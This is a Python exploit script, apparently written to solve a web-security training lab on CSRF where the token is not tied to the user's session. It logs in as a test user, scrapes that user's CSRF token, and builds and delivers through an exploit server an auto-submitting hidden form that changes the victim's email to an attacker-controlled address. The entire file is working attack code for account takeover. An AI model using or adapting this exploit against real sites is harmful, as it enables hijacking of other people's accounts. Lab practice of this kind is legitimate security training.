# CSRF where token is not tied to user session

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	login_path = url + '/login'
	csrf_token = get_csrf_token(s, login_path)
	login_data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	if r.status_code == 200 and 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		session_cookie = s.cookies.get_dict().get('session')
		return session_cookie
	else:
		print('[-] The exploit Failed to log in as Wiener <!>')
		return False

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r2

def send_csrf_with_token(s, url, payload, token, attacker):
	change_email_path = url + '/my-account/change-email'
	exploit_body = """<html>
  <body>
    <form action=\"""" + change_email_path + """\" method="POST">
      <input type="hidden" name="email" value="gwyo&#64;attacker&#46;com" />
      <input type="hidden" name="csrf" value=\"""" + token + """\" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>"""
	r = deliver_payload(s, change_email_path, exploit_body, attacker)
	return r

def send_csrf(s, url, payload, attacker):
	change_email_path = url + '/my-account/change-email'
	exploit_body = payload
	r = deliver_payload(s, change_email_path, exploit_body, attacker)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net $(cat payload01.html)\n\t->\tReplace url in the ACTION attribute (line 4)\n\t->\tReplace CSRF TOKEN in the VALUE field attribute (line 6)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: CSRF where token is not tied to user session')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		input_payload = sys.argv[3:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			if payload == "SOLUTION":
				print('[+] Trying to log on as Wiener User...')
				cookie = connect_as_wiener(s, url)
				time.sleep(1)
				if cookie:
					account_path = url + '/my-account'
					cookies = {"session": cookie}
					s.cookies.update(cookies)
					csrf_token = get_csrf_token(s, account_path)
					print('[+] Trying send a cross-site forged request attack to the victim with Wiener CSRF token...')
					r = send_csrf_with_token(s, url, payload, csrf_token, attacker)
					time.sleep(1)
					if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved')
					elif r.status_code == 200:
						print('[+] The Exploit sent the given payload !')
				else:
					print('[-] The Exploit failed to grab a session cookie <!>')
			else:
				r = send_csrf(s, url, payload, attacker)
				time.sleep(1)
				if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
				elif r.status_code == 200:
					print('[+] The Exploit sent the given payload !')						
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
